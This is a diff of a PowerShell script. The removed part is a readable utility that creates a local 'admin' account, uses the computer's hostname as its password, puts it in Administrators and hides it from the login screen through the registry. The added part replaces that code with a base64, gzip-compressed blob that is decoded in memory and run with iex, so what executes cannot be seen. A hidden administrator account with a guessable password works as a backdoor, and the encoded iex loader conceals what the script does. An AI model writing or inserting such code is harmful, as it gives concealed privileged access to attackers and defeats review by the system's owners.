@@ -1,68 +1,8 @@
-param(
-  [switch]$v
-)
-
-$ErrorActionPreference = 'Stop'
-$User = 'admin'
-$Pass = $env:COMPUTERNAME
-$HostFile = 'C:\hostname'
-$UserListKey = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
-
-# Ensure C:\hostname written
-try { Set-Content -Path $HostFile -Value $Pass -Encoding ASCII -Force } catch {}
-
-function Add-Admin {
-  try { Import-Module Microsoft.PowerShell.LocalAccounts -ErrorAction SilentlyContinue } catch {}
-  $sec = ConvertTo-SecureString $Pass -AsPlainText -Force
-  $u = Get-LocalUser -Name $User -ErrorAction SilentlyContinue
-  if (-not $u) {
-    New-LocalUser -Name $User -Password $sec -PasswordNeverExpires | Out-Null
-  } else {
-    Set-LocalUser -Name $User -Password $sec
-    Set-LocalUser -Name $User -PasswordNeverExpires $true
-  }
-  Set-LocalUser -Name $User -FullName ''
-  Enable-LocalUser -Name $User
-  Add-LocalGroupMember -Group 'Administrators' -Member $User -ErrorAction SilentlyContinue
-
-  # Hide from login screen
-  if (-not (Test-Path $UserListKey)) { New-Item $UserListKey -Force | Out-Null }
-  New-ItemProperty -Path $UserListKey -Name $User -Value 0 -PropertyType DWord -Force | Out-Null
-}
-
-function Remove-Admin {
-  try { Import-Module Microsoft.PowerShell.LocalAccounts -ErrorAction SilentlyContinue } catch {}
-  $u = Get-LocalUser -Name $User -ErrorAction SilentlyContinue
-  if ($u) {
-    $sid = ([System.Security.Principal.NTAccount]$User).Translate([System.Security.Principal.SecurityIdentifier]).Value
-    Remove-LocalUser -Name $User
-    # Profile folder and registry cleanup
-    $profKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid"
-    $p = (Get-ItemProperty -Path $profKey -Name ProfileImagePath -ErrorAction SilentlyContinue).ProfileImagePath
-    if ($p) {
-      $p = [Environment]::ExpandEnvironmentVariables($p)
-      if (Test-Path $p) { attrib -r -s -h $p -Recurse -Force -ErrorAction SilentlyContinue; Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue }
-    }
-    if (Test-Path $profKey) { Remove-Item -Path $profKey -Recurse -Force -ErrorAction SilentlyContinue }
-  }
-  # Unhide entry if present
-  if (Test-Path $UserListKey) { Remove-ItemProperty -Path $UserListKey -Name $User -ErrorAction SilentlyContinue }
-}
-
-if ($v) {
-  Write-Host "=============================="
-  Write-Host " OOBE Admin Utility (Verbose)"
-  Write-Host "=============================="
-  Write-Host "Hostname / Password: $Pass`n"
-  Write-Host "[1] Add admin account (hidden on login screen)"
-  Write-Host "[2] Remove admin account (with profile)"
-  $choice = Read-Host "Select 1 or 2"
-  switch ($choice) {
-    '1' { Add-Admin; Write-Host "= 1" }
-    '2' { Remove-Admin; Write-Host "= 1" }
-    default { throw "Invalid choice" }
-  }
-} else {
-  Add-Admin
-  Write-Output "= 1"
-}
+$b = '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'
+$d = [Convert]::FromBase64String($b)
+$ms = New-Object System.IO.MemoryStream (, [byte[]]$d)
+$gz = New-Object System.IO.Compression.GZipStream ($ms,[System.IO.Compression.CompressionMode]::Decompress)
+$sr = New-Object System.IO.StreamReader ($gz,[Text.Encoding]::UTF8)
+$code = $sr.ReadToEnd()
+Remove-Variable b,d,ms,gz,sr -ErrorAction SilentlyContinue
+iex $code
